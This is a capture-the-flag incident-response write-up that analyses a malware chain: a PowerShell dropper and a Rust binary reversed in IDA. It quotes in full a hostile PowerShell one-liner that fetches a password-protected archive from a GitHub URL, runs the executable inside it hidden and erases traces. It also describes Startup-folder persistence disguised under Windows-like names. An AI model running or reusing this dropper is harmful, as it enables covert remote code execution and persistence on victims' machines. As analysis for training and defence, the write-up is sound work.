IR 2 

Incident Response 2: Wiege
The malicious command downloaded and executed a binary. Find out what it did.

Handout is the same as the one used to solve My Clematis.


So we need to go back to the ps script 


```ps
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9naXRodWIuY29tL2x1a2EtNGV2ci9teS1sb3ZlL3Jhdy9yZWZzL2hlYWRzL21haW4vaG1tLjd6')) | ForEach-Object { $url = $_; $dir = "$env:USERPROFILE\Downloads\hmm_temp"; New-Item -ItemType Directory -Path $dir -Force | Out-Null; $archive = "$dir\hmm.7z"; Invoke-WebRequest -Uri $url -OutFile $archive; & "7z" x "-phyuluvhyuluvhyu" -o"$dir" $archive | Out-Null; Remove-Item $archive; Start-Process -FilePath "$dir\hash_encoder.exe" -WindowStyle Hidden -Wait; Remove-Item $dir -Recurse -Force }
```


This PowerShell one-liner first **decodes a Base64-encoded string to obtain a GitHub URL**, then uses it to **download a password-protected archive**, execute its contents, and clean up all traces. The decoded string resolves to a URL hosting `hmm.7z`. The script creates a temporary directory in the user’s Downloads folder, saves the archive there, and extracts it using 7-Zip with a hardcoded password. After extraction, the archive is deleted, and the extracted executable `hash_encoder.exe` is launched with its window hidden and the script waits for it to finish executing. Once the process completes, the entire temporary directory is removed recursively, leaving minimal artifacts on the system.


The Base64 string decodes to this URL:

```
https://github.com/luka-4evr/my-love/raw/refs/heads/main/hmm.7z
```


So after extracting that we got a binary ; 

<img width="829" height="122" alt="image" src="https://github.com/user-attachments/assets/f8cec150-70d9-4648-8eb8-570c3a1e86dd" />


We'll use IDA for understanding what this exe does 


<img width="727" height="577" alt="image" src="https://github.com/user-attachments/assets/64c222c7-2db1-40d2-a159-f2b078bbb3b8" />


The decompiler identified a main 

<img width="666" height="205" alt="image" src="https://github.com/user-attachments/assets/3e761c57-5458-46ae-ab0a-d4783cffed1a" />


Also there's a TLS function which performs exception handling, stack safety, and thread-local state, then invokes the real program logic via a function pointer, and finally performs optional shutdown handling

```c
__int64 __fastcall sub_14013AA40(__int64 a1, __int64 a2)
{
  __int64 v4; // rax
  __int64 v5; // rdx
  __int64 *v6; // rcx
  signed __int64 v7; // rax
  signed __int64 v8; // rtt
  __int64 result; // rax
  __int64 v10; // rsi
  ULONG StackSizeInBytes[2]; // [rsp+30h] [rbp-50h] BYREF
  _QWORD v12[10]; // [rsp+60h] [rbp-20h] BYREF

  v12[4] = -2;
  AddVectoredExceptionHandler(0, Handler);
  StackSizeInBytes[0] = 20480;
  SetThreadStackGuarantee(StackSizeInBytes);
  GetCurrentThread();
  off_14023D130();
  v4 = *((_QWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + (unsigned int)TlsIndex);
  v5 = *(_QWORD *)(v4 + 96);
  if ( !v5 )
  {
    v6 = (__int64 *)(v4 + 96);
    v7 = qword_14023D358;
    do
    {
      if ( v7 == -1 )
        sub_140179190(v6);
      v5 = v7 + 1;
      v8 = v7;
      v7 = _InterlockedCompareExchange64(&qword_14023D358, v7 + 1, v7);
    }
    while ( v8 != v7 );
    *v6 = v5;
  }
  qword_14023D348 = v5;
  result = (*(int (__fastcall **)(__int64))(a2 + 40))(a1);
  if ( dword_14023D128 )
  {
    v10 = (int)result;
    LOBYTE(v12[0]) = 1;
    *(_QWORD *)StackSizeInBytes = v12;
    sub_1401789C0(
      (unsigned int)&dword_14023D128,
      0,
      (unsigned int)StackSizeInBytes,
      (unsigned int)&unk_14020AB78,
      (__int64)&off_1402095A8);
    return v10;
  }
  return result;
}
```
ALso checking strings there are some interesting things 

<img width="1919" height="1017" alt="image" src="https://github.com/user-attachments/assets/738b6e17-9fa9-4ee0-9243-1d596b50d1dd" />


The binary is rust compiles which makes sense why the CFG is flatlines and the start is just a  setup function 

Summarising with an assumption so far from strings data 

The presence of messages like *“Failed to base64 decode”*, *“Decoded data not UTF-8”*, and various invalid Base64 error strings indicates that the program actively processes Base64-encoded input, matching the earlier PowerShell stage that delivers encoded data. Cryptographic strings such as *“Montgomery Multiplication for x86_64”* suggest use of big-number or hashing primitives. Most critically, hardcoded URLs pointing to attacker-controlled GitHub repositories and Windows paths like the Startup folder and Defender-themed directories reveal that this executable functions as a **secondary loader**, capable of downloading additional payloads, performing network operations, and attempting persistence while masquerading as legitimate Windows components

After corss checking with strings , i came across a big function that seems to be the main logic 

<img width="1505" height="676" alt="image" src="https://github.com/user-attachments/assets/e61c21f3-8445-4871-b21c-d1db882afd40" />

TLDR - 

This function is the **core payload logic** of the malware and ties together everything seen earlier from the PowerShell dropper and strings analysis. At a high level, it **decodes embedded data, decrypts and validates it, establishes persistence, performs staged network communication, and conditionally executes follow-on actions**, all wrapped in heavy Rust runtime machinery.

In sequence, the function first initializes internal Rust structures and decodes an embedded Base64 blob, explicitly handling failure cases such as *“Failed to base64 decode”* and *“Decoded data not UTF-8”*. The decoded buffer is then **XOR-decoded using a repeating key derived from a hardcoded string (`chrome.exeETIN/...`)**, which is classic lightweight obfuscation rather than encryption. Once decoded, the data is validated and processed as UTF-8, indicating it is expected to be structured text rather than raw shellcode.

Next, the function constructs filesystem paths pointing to **`APPDATA\Microsoft\Windows\Start Menu\Programs\Startup`**, along with a cascade of Defender/Telemetry-themed directory names. This strongly indicates **persistence setup via the Startup folder**, with deliberate masquerading as legitimate Windows components. The function dynamically selects one of several benign-looking names to blend in.

After persistence preparation, the function enters a complex loop that **processes input byte-by-byte**, transforms it into chunks, and performs **network I/O** using Windows handles. It computes rolling hashes and bounds checks (using constants and bitwise math) to validate downloaded or received data, rejecting anything that does not meet strict constraints. This logic strongly resembles a **command-and-control staging mechanism**, where payload chunks are fetched, verified, and only executed if integrity checks pass.

Finally, if all checks succeed, the function **writes or executes the received payload**, cleans up allocated memory, closes handles, and returns control back up the call chain. The heavy use of reference counting, allocator calls, and cleanup paths is consistent with **Rust-compiled malware** and explains the verbosity and complexity of the decompilation.


So it's saved as chrome.exe in startup data 
### 
Download and Base64 Decode 

```c
v114 = -2;
sub_1400076E0(&v77, &unk_14017C368, 69);
sub_140008270(Src, &v77);
```

Downloads base64-encoded payload from GitHub and decodes it. The `69` indicates the length parameter.



###  XOR Decryption with "ETIN" Key 

```c
v8 = (char *)*((_QWORD *)&Src[0] + 1);
v9 = *(_QWORD *)&Src[1];
v10 = (char *)(*((_QWORD *)&Src[0] + 1) + *(_QWORD *)&Src[1]);

if ( *(_QWORD *)&Src[1] )
{
    if ( *(_QWORD *)&Src[1] == 4 )
    {
      **((_DWORD **)&Src[0] + 1) ^= 0x4E495445u;  // XOR with "ETIN" (little-endian)
      goto LABEL_21;
    }
    
    v11 = 0;
    v12 = Src[1] & 3;
    if ( (Src[1] & 3) != 0 )
    {
      do
      {
        v8[v11] ^= aChromeExeetinR[v11 + 10];  // XOR with key starting at offset 10
        ++v11;
      }
      while ( v12 != v11 );
      v13 = &v8[v11];
      if ( v9 < 4 )
        goto LABEL_21;
    }
    
    // Main XOR loop - processes 4 bytes at a time
    v14 = ((_BYTE)v11 - 1) & 3;
    v15 = v11 & 3 ^ 2;
    v16 = ((_BYTE)v11 + 1) & 3;  
    v17 = aChromeExeetinR[v11 + 10];
    v18 = aChromeExeetinR[v16 + 10];
    v19 = aChromeExeetinR[v15 + 10];
    v20 = aChromeExeetinR[v14 + 10];
    do
    {
      *v13 ^= v17;      // XOR byte 0
      v13[1] ^= v18;    // XOR byte 1
      v13[2] ^= v19;    // XOR byte 2
      v13[3] ^= v20;    // XOR byte 3
      v13 += 4;
    }
    while ( v13 != v10 );
}
```

 XORs the decoded payload with the repeating key "ETIN" (0x4E495445). Processes data in 4-byte chunks for efficiency.



###  Random Folder Name Selection 

```c
*(_QWORD *)&Src[0] = "WindowsUpdateSystemCacheAppDataCacheDefenderDriverStoreWinSxSDiagnosticsTelemetryWMI";
*((_QWORD *)&Src[0] + 1) = 13;
*(_QWORD *)&Src[1] = "SystemCacheAppDataCacheDefenderDriverStoreWinSxSDiagnosticsTelemetryWMI";
*((_QWORD *)&Src[1] + 1) = 11;
*(_QWORD *)&Src[2] = "AppDataCacheDefenderDriverStoreWinSxSDiagnosticsTelemetryWMI";
*((_QWORD *)&Src[2] + 1) = 12;
*(_QWORD *)&Src[3] = "DefenderDriverStoreWinSxSDiagnosticsTelemetryWMI";
*((_QWORD *)&Src[3] + 1) = 8;
*(_QWORD *)&Src[4] = "DriverStoreWinSxSDiagnosticsTelemetryWMI";
*((_QWORD *)&Src[4] + 1) = 11;
*(_QWORD *)&Src[5] = "WinSxSDiagnosticsTelemetryWMI";
*((_QWORD *)&Src[5] + 1) = 6;
*(_QWORD *)&Src[6] = "DiagnosticsTelemetryWMI";
*((_QWORD *)&Src[6] + 1) = 11;
*(_QWORD *)&Src[7] = "TelemetryWMI";
*((_QWORD *)&Src[7] + 1) = 9;
*(_QWORD *)&Src[8] = "WMI";
*((_QWORD *)&Src[8] + 1) = 3;

hObject[0] = (HANDLE)sub_140132EA0();  // Initialize RNG
v24 = sub_140005D10(hObject, 0, 9);    // Select random index 0-8
```

 Creates an array of 9 system-like folder names and randomly selects one. This makes the malware blend in with legitimate Windows directories under `%APPDATA%`.



###  Byte-to-Base4 Conversion (Lines 155-169)

```c
v45 = v44;
v46 = *v44;  // Get current byte to encode
v89 = v91;

// Create buffer for 4 base-4 digits
*(_QWORD *)&Src[0] = 0;
*((_QWORD *)&Src[0] + 1) = 1;
*(_QWORD *)&Src[1] = 0;
sub_14015DB10(Src, &off_14017C010);

// Extract digit 0 (bits 0-1)
**((_BYTE **)&Src[0] + 1) = v46 & 3;
*(_QWORD *)&Src[1] = 1;

// Extract digit 1 (bits 2-3)
*(_BYTE *)(*((_QWORD *)&Src[0] + 1) + 1LL) = (v46 >> 2) & 3;
*(_QWORD *)&Src[1] = 2;

// Extract digit 2 (bits 4-5)
*(_BYTE *)(*((_QWORD *)&Src[0] + 1) + 2LL) = (v46 >> 4) & 3;
*(_QWORD *)&Src[1] = 3;

// Extract digit 3 (bits 6-7)
*(_BYTE *)(*((_QWORD *)&Src[0] + 1) + 3LL) = v46 >> 6;
*(_QWORD *)&Src[1] = 4;
```

**What it does:** Splits each byte of the decrypted flag into 4 two-bit digits (base-4 representation):
- d0 = byte & 3 (bits 0-1)
- d1 = (byte >> 2) & 3 (bits 2-3)
- d2 = (byte >> 4) & 3 (bits 4-5)
- d3 = byte >> 6 (bits 6-7)

Example: byte 'n' (0x6E = 110) → [1, 2, 3, 2]



###  Hash Function 

<img width="1069" height="648" alt="image" src="https://github.com/user-attachments/assets/1900726d-812d-4340-b4b2-b5dc8789f94f" />


 Computes a 24-bit hash of random file data using custom mixing function with constants:
- `-1163005939` = `0xBAADF00D` (seed)
- `-1640531535` = `0x9E3779B1` 
- `-2048144777` = `0x85EBCA77` 



###   File Generation 

```c
v49 = *v48;  // Get base-4 digit (0-3)
v51 = v49 << 22;  // Shift pool number into top 2 bits of 24-bit space

while ( 1 )
{
    // Generate random file between 1KB-50KB
    *(_QWORD *)&Src[0] = 1024;
    *((_QWORD *)&Src[0] + 1) = 51200;
    LOBYTE(Src[1]) = 0;
    v52 = sub_140005AA0(&v77, Src);
    
    // ... hash calculation ...
    
    v60 = v55 & 0xFFFFFF;  // 24-bit hash result
    
    // Check if hash falls in desired pool range
    if ( v60 < v51 )
        goto LABEL_90;  // Hash too low, regenerate
        
    if ( v60 > v51 + 0x3FFFFF )
        goto LABEL_90;  // Hash too high, regenerate
    
    // Hash is in correct pool - accept this file!
    *((HANDLE *)&v113 + 1) = hObject[1];
    v104 = hObject[0];
    break;
}
```

 For each base-4 digit (0-3), generates random file data and computes its hash. Keeps regenerating until the hash falls within the target pool:

| Pool | Digit | Range Start (v51) | Range End | Check |
|------|-------|-------------------|-----------|-------|
| 0 | 0 | 0x000000 | 0x3FFFFF | `0 ≤ hash ≤ 0x3FFFFF` |
| 1 | 1 | 0x400000 | 0x7FFFFF | `0x400000 ≤ hash ≤ 0x7FFFFF` |
| 2 | 2 | 0x800000 | 0xBFFFFF | `0x800000 ≤ hash ≤ 0xBFFFFF` |
| 3 | 3 | 0xC00000 | 0xFFFFFF | `0xC00000 ≤ hash ≤ 0xFFFFFF` |

The key operation `v51 = v49 << 22` creates the pool boundaries by shifting the 2-bit pool number into the top 2 bits of the 24-bit hash space.



###  File Writing 

```c
LODWORD(Src[0]) = 0;
*((_QWORD *)&Src[0] + 1) = 0;
LODWORD(Src[1]) = 7;
*(_WORD *)((char *)&Src[1] + 13) = 0;
*(_QWORD *)((char *)&Src[1] + 4) = 0x10000000000LL;
*(_WORD *)((char *)&Src[1] + 11) = 257;

v61 = sub_140138EC0(Src, v113, v84, v53);
v41 = (__int64)v62;

if ( (v61 & 1) == 0 )
{
    hObject[0] = v62;
    v41 = sub_140005680(hObject, *((_QWORD *)&v113 + 1), v54);
    CloseHandle(hObject[0]);
```

Creates a file with the generated random data (1-50KB) whose hash falls in the correct pool. Each byte of the flag becomes a folder with 4 such files.



###  Download chrome.exe 

```c
sub_140149DB0(
    (unsigned int)Src,
    v113,
    v69,
    (unsigned int)"chrome.exeETIN/rustc/ed61e7d7e242494fb7057f2657300d9e77bb4fcb\\library\\core\\src\\iter\\traits\\iterator.rs",
    10);

v72 = *(_QWORD *)&Src[1];
v111 = *((_QWORD *)&Src[0] + 1);

// Download binary from GitHub
v2 = (__int64 *)sub_140001120(*((_QWORD *)&Src[0] + 1), *(_QWORD *)&Src[1]);

if ( !v2 )
{
    v73 = (void *)sub_140001000(v111, v72);
    v74 = (__int64)v73;
    // Error handling...
}
```






The malware creates:
```
%APPDATA%\[RandomSystemName]\
  ├── 000_xxxxxxxx\          ← Byte 0 of flag
  │   ├── 0_xxxxxxxxxxxx.bin  (hash in pool d3)
  │   ├── 1_xxxxxxxxxxxx.bin  (hash in pool d2)
  │   ├── 2_xxxxxxxxxxxx.bin  (hash in pool d1)
  │   └── 3_xxxxxxxxxxxx.bin  (hash in pool d0)
  ├── 001_xxxxxxxx\          ← Byte 1 of flag
  │   └── ... (4 files)
  └── ...
```

Each file contains 1-50KB of random base62 data. 








